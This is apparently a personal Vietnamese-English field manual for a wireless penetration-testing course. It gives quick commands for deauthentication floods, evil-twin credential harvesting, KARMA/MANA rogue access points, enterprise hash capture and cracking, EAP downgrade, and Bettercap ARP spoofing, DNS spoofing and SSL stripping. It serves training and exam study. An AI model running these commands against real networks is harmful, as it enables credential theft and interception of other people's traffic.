---
title: "Field Manual"
tags: [pentest, wireless, field-manual, reference]
created: 2026-04-01
---

> **Mục đích**: Tài liệu tra cứu nhanh trong thi — mỗi lesson thêm một entry.
> **Cách dùng**: Ctrl+F technique name → xem lệnh nhanh, điều kiện, và link về lesson đầy đủ.

---

## Recon & Enumeration

#### Wireless Reconnaissance
- **Condition**: Cần xác định APs, channels, clients và security type trước khi tấn công
- **Quick command**: `sudo airodump-ng wlan0mon`
- **Full flow**: `airmon-ng start wlan0` → `airodump-ng wlan0mon` → `airodump-ng -c CH --bssid BSSID -w capture wlan0mon`
- **Look for**: Target SSID, BSSID, channel, cipher (WPA2/WPA3), connected clients (STAs)
- **Ref**: [[02-wireless-lab-setup|02. Wireless Lab Setup]]

---

## Wireless Attacks

#### Evil Twin — WPA2-Personal + Captive Portal
- **Condition**: Target AP dùng WPA2-PSK; cần wireless card hỗ trợ AP mode; client phải connect vào rogue AP
- **Quick command**: `sudo hostapd hostapd-evil.conf` + `sudo dnsmasq -C dnsmasq.conf`
- **Full flow**: `airodump-ng` (recon) → `aireplay-ng --deauth` (force disconnect) → `hostapd` (rogue AP) → `dnsmasq` (DHCP+DNS) → `iptables` (NAT) → `nginx` (captive portal) → harvest creds
- **Look for**: Client connects to rogue AP, submits password to captive portal → saved in passes.lst
- **Ref**: [[03-evil-twin-wpa2-personal|03. Evil Twin WPA2-Personal]]

#### Deauthentication Attack
- **Condition**: Client đang connected vào target AP; cần wlan0mon ở đúng channel; WPA2 (không áp dụng với WPA3 PMF)
- **Quick command**: `sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon`
- **Full flow**: `airodump-ng` (xác định BSSID + channel) → `airmon-ng start wlan0` → `aireplay-ng --deauth 0 -a BSSID -c CLIENT_MAC wlan0mon`
- **Look for**: Client disconnects và reconnects (thấy trong airodump); `--deauth 0` = continuous flood
- **Ref**: [[03-evil-twin-wpa2-personal|03. Evil Twin WPA2-Personal]]

#### KARMA / MANA Attack
- **Condition**: Devices trong range đang probe cho networks trong PNL; cần hostapd-mana hoặc EAPHammer
- **Quick command**: `sudo ./eaphammer -i wlan0 --karma --essid fakenet --auth open`
- **Full flow**: `airodump-ng` (observe probe requests) → `eaphammer --karma` (respond to all probes) → client connects → post-connection attack
- **Look for**: Tool logs client MACs connecting + their probed SSIDs
- **Ref**: [[04-karma-mana-attacks|04. Karma & MANA Attacks]]

#### MANA Loud Mode Attack
- **Condition**: Modern devices ignore directed probe responses; cần reconstruct PNL từ observed broadcast probes
- **Quick command**: `sudo ./eaphammer -i wlan0 --mana --loud --essid fakenet --auth open`
- **Full flow**: Listen broadcast probes → build per-device PNL → respond with union of all PNLs → client connects
- **Look for**: Client connection logs trong EAPHammer output; kiểm tra `--cloaking full` để tránh detection
- **Ref**: [[04-karma-mana-attacks|04. Karma & MANA Attacks]]

#### Evil Twin — WPA-Enterprise (PEAP/TTLS Hash Capture)
- **Condition**: Target AP dùng WPA-Enterprise (802.1X); client không validate server certificate
- **Quick command**: `sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "Corp-WiFi" --creds`
- **Full flow**: Generate fake cert → `eaphammer` (rogue AP + fake RADIUS) → deauth clients → clients connect → EAP handshake → capture MSCHAPv2 NTHash → `hashcat -m 5600`
- **Look for**: `username::domain:challenge:response` trong output → crack với hashcat mode 5600
- **Ref**: [[05-evil-twin-wpa-enterprise|05. Evil Twin WPA-Enterprise]]

#### EAP Downgrade Attack
- **Condition**: Client hỗ trợ nhiều EAP methods; server (attacker) negotiate xuống EAP-GTC/PAP
- **Quick command**: Modify `hostapd.eap_user`: `* PEAP,TTLS,GTC "t" TTLS-PAP,GTC`
- **Full flow**: Configure hostapd-wpe để force GTC/PAP → client sends plaintext credentials → logged directly
- **Look for**: Plaintext `username:password` trong hostapd-wpe log (không cần crack)
- **Ref**: [[05-evil-twin-wpa-enterprise|05. Evil Twin WPA-Enterprise]]

---

## Post-Connection MitM

#### ARP Spoofing (Bettercap)
- **Condition**: Attacker và victim trên cùng subnet; IP forwarding enabled; không có static ARP
- **Quick command**: `sudo bettercap -iface wlan1 -eval "set arp.spoof.targets TARGET; arp.spoof on"`
- **Full flow**: `net.probe on` (discover hosts) → `set arp.spoof.targets IP` → `set arp.spoof.fullduplex true` → `arp.spoof on` → `net.sniff on`
- **Look for**: Packets flowing through attacker; credentials in sniff output; `[ARP] spoofing` log lines
- **Ref**: [[06-post-connection-mitm-arp|06. Post-Connection MitM — ARP]]

#### DNS Spoofing (Bettercap)
- **Condition**: ARP spoof đang active; attacker kiểm soát DNS resolution của victim
- **Quick command**: `set dns.spoof.domains target.com; set dns.spoof.address ATTACKER_IP; dns.spoof on`
- **Full flow**: ARP spoof on → `dns.spoof.domains *` → `dns.spoof on` → victim DNS queries redirect đến attacker IP
- **Look for**: DNS queries từ victim resolving đến attacker IP; redirect victim browser đến fake page
- **Ref**: [[07-post-connection-mitm-dns-ssl|07. Post-Connection MitM — DNS & SSL]]

#### SSL Strip (Bettercap)
- **Condition**: Victim truy cập HTTP sites (HTTPS không có HSTS); ARP spoof active
- **Quick command**: `set https.proxy.sslstrip true; https.proxy on`
- **Full flow**: ARP spoof → `http.proxy on` → `set https.proxy.sslstrip true` → `https.proxy on` → intercept HTTPS → serve HTTP → capture creds
- **Look for**: HTTP credentials trong bettercap sniff output; warning "HSTS header detected" nếu site có HSTS
- **Ref**: [[07-post-connection-mitm-dns-ssl|07. Post-Connection MitM — DNS & SSL]]

---

## Tools Reference

#### EAPHammer
- **Condition**: WPA-Enterprise Evil Twin hoặc Karma/MANA attacks
- **Quick command**: `sudo ./eaphammer -i wlan0 --channel CH --auth wpa-eap --essid SSID --creds`
- **Full flow**: `python3 eaphammer --cert-wizard` (gen cert) → `eaphammer --auth wpa-eap --creds` → wait for clients → capture NTHash
- **Look for**: MSCHAPv2 challenge/response pairs trong output
- **Ref**: [[08-tool-eaphammer|08. Tool: EAPHammer]]

#### Bettercap
- **Condition**: Post-connection MitM sau khi victim connect vào network (rogue AP hoặc shared network)
- **Quick command**: `sudo bettercap -iface IFACE`
- **Full flow**: Launch → `net.probe on` → `net.show` → configure modules → run attack → `net.sniff on`
- **Look for**: Credentials, cookies, DNS queries trong sniff output; caplets automate full chain
- **Ref**: [[09-tool-bettercap|09. Tool: Bettercap]]

---

*Field Manual được cập nhật sau mỗi lesson. KHÔNG edit thủ công phần trên — chỉ thêm entries vào các sections.*
